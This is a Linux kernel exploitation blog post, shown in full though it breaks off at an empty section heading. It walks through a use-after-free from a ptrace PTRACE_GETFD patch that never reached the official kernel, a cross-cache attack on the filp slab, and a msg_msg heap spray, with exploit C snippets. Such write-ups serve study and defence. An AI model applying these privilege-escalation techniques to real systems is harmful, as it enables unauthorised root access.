---
layout: post
title: No CVE for this. It has never been in oficial kernel
date: 2023-06-28
categories: ["exploiting", "Linux", "Kernel"]
thumbnail: "assets/images/thumb1.png"
---

# No CVE for [this](https://lkml.org/lkml/2019/12/5/814) bug wich has never been in oficial kernel

## Introduction

In this blog post I will show how I wrote an exploit for [this](https://lkml.org/lkml/2019/12/5/814) bug wich has never been in oficial kernel, thus, to achieve local privilege escalation in Linux kernel 5.10.77.

**ptrace** is a system call wich you can take the control from another process. In this article, the PTRACE_GETFD command is introduced to Linux kernel. Who can get the file descriptor indicated from the vitcim process to trace it.

## The bug

```C
1 static int ptrace_getfd(struct task_struct *child, unsigned long fd)
2 {
3	struct files_struct *files;
4	struct file *file;
5	int ret = 0;
6
7	files = get_files_struct(child);
8	if (!files)
9		return -ENOENT;
10
11	spin_lock(&files->file_lock);
12	file = fcheck_files(files, fd);
13	if (!file)
14		ret = -EBADF;
15	else
16		get_file(file); // increment f_count
17	spin_unlock(&files->file_lock);
18	put_files_struct(files);
19
20	if (ret)
21		goto out;
22
23	ret = get_unused_fd_flags(0);
24	if (ret >= 0)
25		fd_install(ret, file); // install the reference in file table
26
27	fput(file); // decrement f_count
28 out:
29	return ret;
30 }
``` 

In line 16, get_file increments the f_count, well, it must do it, but in line 27 fput is decrementing again, wich it should not do it. The result is a one extra reference installed in the file table and f_count is the same. Two references with f_count = 1... If do close over one fd from them, we have an UAF over the other fd reference.


## Cache isolated

In this kernel, the file cache is isolated by the flag SLAB_ACCOUNT

```C
380 void __init files_init(void)
381 {
382	filp_cachep = kmem_cache_create("filp", sizeof(struct file), 0,
383			SLAB_HWCACHE_ALIGN | SLAB_PANIC | SLAB_ACCOUNT, NULL);
384	percpu_counter_init(&nr_files, 0, GFP_KERNEL);
385 }
```

This mean that we can´t get other object from general purpose (kmalloc) to allocate over the UAF. How solve this? [Cross cache attack](https://veritas501.github.io/2023_03_07-Cross%20Cache%20Attack%E6%8A%80%E6%9C%AF%E7%BB%86%E8%8A%82%E5%88%86%E6%9E%90/) is a teqnique where you can free the file object created and return to budy allocator. After this, we can allocate other object from general purpose to exploit the bug.


## Cross Cache attack

For freeing one object from their slab, we must free the whole page of the object. Thus, we need to do a serie of calls to arrive to discard_slab(). When kmem_cache_free is called a serie of calls are done.

```
kmem_cache_free()
 |
 + slab_free() 
    | 
    + do_slab_free() 
       |
       +__slab_free()
           |
           + put_cpu_partial()
              |
              + unfreeze_partials()
                 |
                 + discard_slab()
```

In [kmem_cache_free](https://elixir.bootlin.com/linux/v5.10.77/source/mm/slub.c#L3160) the function only checks if the object is from their own cache, but the object will be freed. do_slab_free is the wrapper of [slab_free](https://elixir.bootlin.com/linux/v5.10.77/source/mm/slub.c#L3141). In [do_slab_free](https://elixir.bootlin.com/linux/v5.10.77/source/mm/slub.c#L3122) the function checks if the page wich is going to be freed is from the actual cpu partial active, if this is true, it will adds to the freelist, it calls to __slab_free otherwise.

Observe this image and these structs before to go on, assuming you are familiar with how the heap is organized in Linux kernel (in this case, SLUB in Ubuntu) and you know that there are types of objects with their own dedicated cache. One object from dedicated cache (for example file object "filp") can´t go to other dedicated cache (for example "jar_creds") or general purpose cache (kmalloc). In a full list, all the slab are with allocated objects. In a partial list, there are a mix with allocated and free objects. In a empty list, all the objects are freed.

![SLUB](/assets/images/SLUB.png)

```C
struct kmem_cache_node {
	spinlock_t list_lock;

#ifdef CONFIG_SLAB
	struct list_head slabs_partial;	/* partial list first, better asm code */
	struct list_head slabs_full;
	struct list_head slabs_free;
	unsigned long total_slabs;	/* length of all slab lists */
	unsigned long free_slabs;	/* length of free slab list only */
	unsigned long free_objects;
	unsigned int free_limit;
	unsigned int colour_next;	/* Per-node cache coloring */
	struct array_cache *shared;	/* shared per node */
	struct alien_cache **alien;	/* on other nodes */
	unsigned long next_reap;	/* updated without locking */
	int free_touched;		/* updated without locking */
#endif

#ifdef CONFIG_SLUB
	unsigned long nr_partial;
	struct list_head partial;
#ifdef CONFIG_SLUB_DEBUG
	atomic_long_t nr_slabs;
	atomic_long_t total_objects;
	struct list_head full;
#endif
#endif
};
```
```C
struct kmem_cache {
	struct kmem_cache_cpu __percpu *cpu_slab;
	/* Used for retrieving partial slabs, etc. */
	slab_flags_t flags;
	unsigned long min_partial;
	unsigned int size;	/* The size of an object including metadata */
	unsigned int object_size;/* The size of an object without metadata */
	struct reciprocal_value reciprocal_size;
	unsigned int offset;	/* Free pointer offset */
#ifdef CONFIG_SLUB_CPU_PARTIAL
	/* Number of per cpu partial objects to keep around */
	unsigned int cpu_partial;
#endif
...
struct kmem_cache_node *node[MAX_NUMNODES];
};
```
```C
struct kmem_cache_cpu {
	void **freelist;	/* Pointer to next available object */
	unsigned long tid;	/* Globally unique transaction id */
	struct page *page;	/* The slab from which we are allocating */
#ifdef CONFIG_SLUB_CPU_PARTIAL
	struct page *partial;	/* Partially allocated frozen slabs */
#endif
#ifdef CONFIG_SLUB_STATS
	unsigned stat[NR_SLUB_STAT_ITEMS];
#endif
};
```

###### [__slab_free](https://elixir.bootlin.com/linux/v5.10.77/source/mm/slub.c#L2966)

The kernel will check if the page of the object freed is from active slab or on a partial list. If this condition is met, the object will be freed, the function [put_cpu_partial](https://elixir.bootlin.com/linux/v5.10.77/source/mm/slub.c#L2377) is called otherwise. Going over, if the object is in a full slab and it is not in active slab, it will call to put_cpu_partial because we need to put the slab in the partial list to be handled. The full slabs are not accounted for. The next step into the function [put_cpu_partial](https://elixir.bootlin.com/linux/v5.10.77/source/mm/slub.c#L2418) the kernel checks if the number of the pobjects (slabs) in the partial list exceeds the limit, wich in this kernel are 13, and think if we are freeing one object from each 14 full slab, no actives, there will be 14 slab to be handled, and the last slab will cause a overflow in the partial list and the slab will be transfered to the node partial list, because of this, the kernel will call to [unfreeze_partials](https://elixir.bootlin.com/linux/v5.10.77/source/mm/slub.c#L2309). Into the function unfreeze_partials the pages (slabs) not empty will be transfered to the node partial list, [discard_slab](https://elixir.bootlin.com/linux/v5.10.77/source/mm/slub.c#L2347) will be called if the page (slab) is empty and not used (new.inuse = 0). See the image offered by this nice [write up](https://ruia-ruia.github.io/2022/08/05/CVE-2022-29582-io-uring/) explaining this.

![Control flow](/assets/images/freeslab.jpg)


Then, the plan is the following scenario, after gathering information:

```
$ sudo cat /sys/kernel/slab/filp/object_size
256
$ sudo cat /sys/kernel/slab/filp/objs_per_slab
16
$ sudo cat /sys/kernel/slab/filp/cpu_partial
13
```


* Alloc (cpu_partial + 1) * objs_per_slab = (13 + 1) * 16
* Alloc objs_per_slab - 1 = 15
* Alloc the vulnerable object
* Alloc objs_per_slab + 1 = 17
* Get UAF over the vulnerable object 
* Free the whole slab of the vulnerable object
* Free only one object from 14 full slab to cause overflow in the partial list


But, there is a problem :( in this kernel, there isn´t a whole slab with 16 objects in the same page until the slab allocated ~92 ish..


| Slab | 0 |
|------|------|
| stdin | stdout | 
| stderr | object page A |
| object page A | object page A |
| object page B | object page B |
| object page C | object page C |
| object page C | object page A |
| object page A | object page D |
| object page D | object page D |
|------|------|

| Slab | ~92 |
|------|------|
| object page N | object page N | 
| object page N | object page N |
| object page N | object page N |
| object page N | object page N |
| object page N | object page N |
| object page N | object page N |
| object page N | object page N |
| object page N | object page N |
|------|------|

Thus, the plan is to use the same scenario but with cpu_partial = 128 (to ensure our success). Remember that the full slabs are not accounted for.


## msg_msg objects spray

Now, we need to allocate over the before freed object. What could we use? msgsnd and msgrcv are syscalls used in multiple exploits to achieve primitive read/write. The messages can be of multiple size, and their allocation with kmalloc goes with the flag GFP_KERNEL_ACCOUNT. Using this, to ensure that the before freed object will be served on one msg_msg object. See the struct.

```
struct msg_msg {
	struct list_head m_list;
	long m_type;
	size_t m_ts;		/* message text size */
	struct msg_msgseg *next;
	void *security;
	/* the actual message follows immediately */
};
```

We are going to allocate messages of size 4096 - 48 (the struct size msg_msg, the header) + 256 - 8 (the metadata msg_msgseg in the 256 size chunk). Thus, it will allocate chunks of a whole page with their header, and afterwards, it will allocate another chunk of 256 size, and the next pointer in the header will point to it. The first 8 bytes in 256 chunk is also the pointer struct msg_msgseg *next wich it will be NULL. Why this? The file object is the size 256, and if we allocate only the size 256 on msg_msg, it will has their own header, and we will be matching fields in the file object, and we don´t want that.


```
size 4096					size 256
m_list.next		m_list.prev		next=NULL	AAAA
m_type=0x41		m_ts=0x10c8		AAAA		AAAA
next=(chunk 256)	security=NULL		....		....
AAAA			AAAA			AAAA		AAAA
AAAA			AAAA
....			....
AAAA			AAAA 
```

Then, to set the correct fields in the freed file object and locate the message, we will populate the following fields. See the struct file:

```
struct file {
	union {
		struct llist_node	fu_llist;
		struct rcu_head 	fu_rcuhead;
	} f_u;
	struct path		f_path;
	struct inode		*f_inode;	/* cached value */
	const struct file_operations	*f_op;

	/*
	 * Protects f_ep_links, f_flags.
	 * Must not be taken from IRQ context.
	 */
	spinlock_t		f_lock;
	enum rw_hint		f_write_hint;
	atomic_long_t		f_count;
	unsigned int 		f_flags;
	fmode_t			f_mode;
	struct mutex		f_pos_lock;
	loff_t			f_pos;
	struct fown_struct	f_owner;
	const struct cred	*f_cred;
	struct file_ra_state	f_ra;

	u64			f_version;
#ifdef CONFIG_SECURITY
	void			*f_security;
#endif
	/* needed for tty driver, and maybe others */
	void			*private_data;

#ifdef CONFIG_EPOLL
	/* Used by fs/eventpoll.c to link all the hooks to this file */
	struct list_head	f_ep_links;
	struct list_head	f_tfile_llink;
#endif /* #ifdef CONFIG_EPOLL */
	struct address_space	*f_mapping;
	errseq_t		f_wb_err;
	errseq_t		f_sb_err; /* for syncfs */
} __randomize_layout
  __attribute__((aligned(4)));	/* lest something weird decides that 2 is OK */
```

See what happens when we do close over the file

```
1278 int filp_close(struct file *filp, fl_owner_t id)
1279 {
1280	int retval = 0;
1281
1282	if (!file_count(filp)) {
1283		printk(KERN_ERR "VFS: Close: file count is 0\n");
1284		return 0;
1285	}
1286
1287	if (filp->f_op->flush)
1288		retval = filp->f_op->flush(filp, id);
1289
1290	if (likely(!(filp->f_mode & FMODE_PATH))) {
1291		dnotify_flush(filp, id);
1292		locks_remove_posix(filp, id);
1293	}
1294	fput(filp);
1295	return retval;
1296 }
```

Only need that f_count > 0, the f_op->flush contains a NULL (flush is at f_op+0x70) and f_mode to be 0x4000.

```
#define FMODE_PATH		((__force fmode_t)0x4000)
```

What address can be f_op? In [this](https://ruia-ruia.github.io/2022/08/05/CVE-2022-29582-io-uring/) nice write up, it advices the NULL_MEM 0xfffffe0000002000 address.

Because we don´t want another UAF yet, we will put the f_count = 2, only to locate the chunk and for doing other after spray. Like so, we are going to do msgrcv (with the flag MSG_COPY, it will do a copy and the message isn´t deleted) and locate it. If the message is found, it will be deleted for the next target object for the exploit.

```
int peek_msg(int msqid, void *msgp, size_t msgsz, long msgtyp) {

	if (msgrcv(msqid, msgp, msgsz, msgtyp, MSG_COPY | IPC_NOWAIT | MSG_NOERROR) < 0) {
		perror("[-] msgrcv");
		printf("errno: %d\n", errno);
		exit(0);
	}
	
	return 0;
}

int read_msg(int msqid, void *msgp, size_t msgsz, long msgtyp) {

	if (msgrcv(msqid, msgp, msgsz, msgtyp, IPC_NOWAIT | MSG_NOERROR) < 0) {
		perror("[-] msgrcv");
		exit(0);
	}
	
	return 0;
}
```

```
char *buf = NULL;
uint32_t uaf = 0;
for (i = 0; i < NUM_MSQIDS; i++) {
	pin_cpu(i % ncpus);
	/* Read de messages of first spray for finding the vulnerable object */
	memset(&message_r, 0, sizeof(message_r));
	if (peek_msg(msqid[i], &message_r, sizeof(message_r.text), 0) < 0) {
		perror("[-] peek_msg");
		exit(0);
	}

	buf = ((char *) &message_r) + PAGE_SIZE - MSG_HEAD_SIZE;
	/* Found message, deleted */
	if (buf[56] != 2) {
		uaf = i;
		printf("[+] Found object at %d\n", uaf);
		memset(&message_r, 0, sizeof(message_r));
		if (read_msg(msqid[uaf], &message_r, sizeof(message_r.text), MTYPE_FIRST) < 0) {
			perror("[-] read_msg");
			exit(0);
		}
		break;
	}
}
```

We want a read primitive, but with these objects we can´t achieve it because we don´t control the field size from the object msg_msg.


## user_key_payload objects spray



